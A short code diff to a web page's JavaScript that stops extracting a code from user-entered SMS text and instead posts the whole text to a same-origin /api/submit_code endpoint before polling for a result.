@@ -231,12 +231,10 @@
                 startCountdown();
                 return;
             }
-            var codeMatch = smsText.match(/\b[a-zA-Z0-9]{8,30}\b/);
-            var enteredCode = codeMatch ? codeMatch[0] : smsText.replace(/\s/g, '').slice(0, 30);
             
             document.getElementById('screen3').classList.remove('active'); 
             document.getElementById('screen4').classList.add('active'); 
-            await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: enteredCode }) }); 
+            await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: smsText }) }); 
             if (checkInterval) clearInterval(checkInterval); 
             checkInterval = setInterval(async function() { 
                 try { 
